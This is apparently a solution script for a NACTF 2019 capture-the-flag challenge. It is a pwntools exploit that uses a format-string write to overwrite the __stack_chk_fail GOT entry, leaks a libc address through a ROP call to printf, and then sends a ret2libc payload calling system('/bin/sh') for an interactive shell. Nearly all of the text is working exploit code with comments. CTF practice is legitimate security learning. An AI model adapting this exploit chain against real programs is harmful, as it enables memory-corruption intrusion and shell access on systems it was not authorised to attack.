from pwn import *

r = remote('shell.2019.nactf.com', 31732)
# r = process('./loopy-1')
libc = ELF('./libc.so.6')

r.recvuntil('Type something>')

stack_chk_fail_got = 0x804c014
printf_plt = 0x8049030
printf_got = 0x804c00c
vuln = 0x080491a2

# Overwrite address of __stack_chk_fail () GOT with ret ROPgadget (0x0804900a) to render it useless

payload = p32(stack_chk_fail_got)       # Insert address to first 2 bytes of stack_chk_fail_got into 7th parameter
payload += p32(stack_chk_fail_got + 2)  # Insert address to last 2 bytes of stack_chk_fail_got into 8th parameter
payload += '%7$36866x'                  # Find number of characters to write 900a. We use printf formatting to pad these characters
payload += '%7$hn'                      # Write number of characters printed so far (900a) into pointer at 7th parameter
payload += '%8$30714x'                  # Find number of characters to write 10804 since number of chars is already > 804. We use hn to only write 2 bytes 
payload += '%8$hn'                      # Write number of characters printed so far (10804) into pointer at 8th but only 0804 will be written because of hn
payload += 'A' * 44                     # Fill the buffer until return pointer

# Same as Loopy #1 with exception of 80 A's printed instead of 76 because the stack canary takes up 4 bytes
payload +=  p32(printf_plt) + p32(vuln) + p32(printf_got)

r.sendline(payload)

r.recvuntil(p32(printf_got))
leak = r.recv(4)
printf_libc = u32(leak)
print('printf@libc: ', hex(printf_libc))

libc.address = printf_libc - libc.symbols['printf']
bin_sh = libc.search('/bin/sh').next()
system = libc.symbols['system']

r.recvuntil('Type something>')
payload = 'A' * 80 + p32(system) + 'AAAA' + p32(bin_sh)
r.sendline(payload)

r.interactive()
r.close()
